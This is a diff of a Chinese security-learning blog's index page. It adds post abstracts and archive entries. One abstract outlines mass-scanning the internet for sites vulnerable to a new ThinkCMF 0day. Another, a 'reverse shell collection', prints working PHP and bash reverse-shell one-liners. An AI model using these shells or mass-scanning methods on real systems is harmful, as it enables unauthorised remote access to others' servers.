@@ -346,6 +346,106 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/2019/10/24/Thinkcmf批量搜漏洞并提交到漏洞平台/" >
+            
+                <span>Thinkcmf批量搜漏洞并提交到漏洞平台</span>
+        </a>
+        <div class="abstract-content">
+            前言最近Thinkcmf爆出了一个0day，可以利用该漏洞在网站根目录下写文件，并可以访问，从而触发代码执行漏洞。对于刚爆出的漏洞，我们如何进行全网扫描，并快速提交到漏洞平台，这是本文所要介绍的。
+思路首先我们要先知道thinkcmf的指纹，然后通过指纹利用搜索引擎进行批量获取目标，将目标入库整理，再对目标测试是否有漏洞，有漏洞的目标再获取目标具体信息，最后提交到漏洞平台，具体可以分成以下几个阶段。
+
+获取指纹
+搜索目标
+目标入库
+检测目标
+获取目标信息
+提交漏洞
+
+获取指纹可以先利用fofa、钟馗之眼、shodan等来获取少量目标网站，通过对目标网站抓包，查看返回包具体特征，来获取网站...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/24</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/10/24/python编程总结/" >
+            
+                <span>python编程总结</span>
+        </a>
+        <div class="abstract-content">
+            python操作mysql数据库查询123456import pymysqldb = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;subdomain&quot;)cursor = db.cursor()cursor.execute(&quot;select version&quot;)data = cursor.fetchone()db.close()
+插入12345678910conn = pymysql.connect(&quot;localhost&quot;,&quot...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/24</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/10/24/反弹shell合集/" >
+            
+                <span>反弹shell合集</span>
+        </a>
+        <div class="abstract-content">
+            php反弹shell&lt;?php $sock = fsockopen(&quot;127.0.0.1&quot;, 1234);$descriptorspec = array(0 =&gt; $sock,1 =&gt; $sock, 2 =&gt; $sock);$process = proc_open(&quot;/bin/bash&quot;, $descriptorspec, $pipes);proc_close($process);
+bash反弹shellbash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1
+
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/24</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/2019/10/19/linux常用指令/" >
             
                 <span>linux常用指令</span>
@@ -478,36 +578,6 @@
 背单词 ，高数上复习
 
 
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/16</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/10/16/python编程总结/" >
-            
-                <span>python编程总结</span>
-        </a>
-        <div class="abstract-content">
-            python操作mysql数据库查询123456import pymysqldb = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;subdomain&quot;)cursor = db.cursor()cursor.execute(&quot;select version&quot;)data = cursor.fetchone()db.close()
-插入12345678910conn = pymysql.connect(&quot;localhost&quot;,&quot...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
@@ -1292,37 +1362,9 @@
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 43
+        Total : 45
         </div>
         <!-- search  -->
         
@@ -1335,6 +1377,21 @@
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/24</span><a class="archive-post-title" href= "/2019/10/24/Thinkcmf批量搜漏洞并提交到漏洞平台/" >Thinkcmf批量搜漏洞并提交到漏洞平台</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/24</span><a class="archive-post-title" href= "/2019/10/24/python编程总结/" >python编程总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/24</span><a class="archive-post-title" href= "/2019/10/24/反弹shell合集/" >反弹shell合集</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1359,11 +1416,6 @@
     
         <li class="archive-post-item">
             <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/2019/10/16/2019下半年计划/" >2019下半年计划</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/2019/10/16/python编程总结/" >python编程总结</a>
         </li>
     
     
@@ -1413,12 +1465,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/05</span><a class="archive-post-title" href= "/2019/09/05/alert(1) to win wp/" >alert(1) to win wp</a>
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href= "/2019/09/05/XSS挑战write up/" >XSS挑战write up</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/05</span><a class="archive-post-title" href= "/2019/09/05/XSS挑战write up/" >XSS挑战write up</a>
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href= "/2019/09/05/alert(1) to win wp/" >alert(1) to win wp</a>
         </li>
     
     
@@ -1453,12 +1505,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/2019/08/23/跨域实现-jsonp和CORS/" >跨域实现-jsonp和CORS</a>
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/2019/08/23/sqli-labs 通关1/" >sqli-labs 通关1</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/2019/08/23/sqli-labs 通关1/" >sqli-labs 通关1</a>
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/2019/08/23/跨域实现-jsonp和CORS/" >跨域实现-jsonp和CORS</a>
         </li>
     
     
@@ -1523,12 +1575,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/13</span><a class="archive-post-title" href= "/2019/05/13/bugku代码审计wp/" >bugku代码审计wp</a>
+            <span class="archive-post-date">05/13</span><a class="archive-post-title" href= "/2019/05/13/代码审计的相关函数分析/" >代码审计相关函数分析</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/13</span><a class="archive-post-title" href= "/2019/05/13/代码审计的相关函数分析/" >代码审计相关函数分析</a>
+            <span class="archive-post-date">05/13</span><a class="archive-post-title" href= "/2019/05/13/bugku代码审计wp/" >bugku代码审计wp</a>
         </li>
     
     
